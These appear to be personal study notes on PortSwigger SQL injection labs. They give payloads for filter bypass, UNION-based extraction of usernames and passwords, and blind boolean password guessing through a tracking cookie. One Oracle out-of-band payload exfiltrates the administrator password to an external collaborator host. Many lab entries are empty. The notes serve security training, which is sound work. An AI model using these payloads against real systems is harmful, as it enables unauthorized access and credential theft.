sqli labs

<!-- SQL injection vulnerability in WHERE clause allowing retrieval of hidden data -->
https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

injectable code:
SELECT * FROM products WHERE category = 'Gifts' AND released = 1

goal: perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased. 

payload1 = Accessories'--+-  // eliminating the release clause shows unreleased items

payload2 = 
'+OR+1=1--+-


<!-- Lab: SQL injection vulnerability allowing login bypass -->
https://portswigger.net/web-security/sql-injection/lab-login-bypass


<!-- SQL injection UNION attack, determining the number of columns returned by the query -->
https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

-- PayLoad:
'+UNION+SELECT+NULL,+NULL,+NULL+FROM+information_schema.tables--+-

'+UNION+SELECT+NULL,NULL,NULL--+-


'+UNION+SELECT+NULL+FROM+information_schema.tables--+-

<!-- SQL injection UNION attack, finding a column containing text -->
https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text

-- PayLoad:
'+UNION+SELECT+NULL,'IWfxqs',NULL--+-


<!-- SQL injection UNION attack, retrieving data from other tables -->
https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

-- PayLoad:
'+UNION+SELECT+username,password+FROM+users--




<!-- SQL injection UNION attack, retrieving multiple values in a single column -->
https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column



<!-- SQL injection attack, querying the database type and version on Oracle -->
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle



<!-- SQL injection attack, querying the database type and version on MySQL and Microsoft -->
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft



<!-- SQL injection attack, listing the database contents on non-Oracle databases -->
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle


<!-- SQL injection attack, listing the database contents on Oracle -->
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle



<!-- Blind SQL injection with conditional responses -->
https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

-- what we know:
injection vector = cookie "TrackingId" parameter
table = users
columns = username, password

lab 'tell' is a 'welcome screen' that is beeing loaded when any row returns a value,
effectivly changing the content length from any response without a raw.

-- plan of attack
- check injection point by breaking the code with "'"
- establish baseline: 'correct' response length and 'failed' response length:
- guess a letter and check response length for clues


-- SQL command to use: 
SUBSTR(string, start, length)

substr(cat,1,1) = "c"
substr(dog,2,1) = "o"
substr(blue,2,2) = "lu"
substr(united,4,3) = "ted"

to guess we need to compare each letter in the password to a letter of our choice:
password 1st letter  = 'a' // example

-- command explanation:
AND SUBSTR(
    (SELECT password FROM users WHERE username = 'administrator'),        // string = password to check
    1,1)                                                                  //start substring from XX and for length of YY
    ='a                                                                  // compare to our charecter guess

payload example:
'and substr((select password from users where username='administrator'),1,1)='a          //light version

payload inside code - using "pass_index" and "i" variables:
trackingId +'+AND+SUBSTR((SELECT+password+FROM+users+WHERE+username+%3d+'administrator'),+{pass_index},+1)+=+'{i}"




<!-- Blind SQL injection with conditional errors -->
https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

<!-- Blind SQL injection with time delays -->
https://portswigger.net/web-security/sql-injection/blind/lab-time-delays


<!-- Blind SQL injection with time delays and information retrieval -->
https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval


<!-- Blind SQL injection with out-of-band interaction -->
https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band


<!-- Blind SQL injection with out-of-band data exfiltration -->
https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration

TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--

x' UNION SELECT EXTRACTVALUE(
    xmltype('
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [<!ENTITY remote SYSTEM "https://exploit-0ab100770308f09ac0035e9f011400f7.web-security-academy.net/exploit/"+(SELECT password FROM users WHERE username='administrator')>]> 
    &remote
    '),'/l') FROM dual--
    ; session=1fmMdR7yS8HGwofR1SYnkvbWDxEogGkP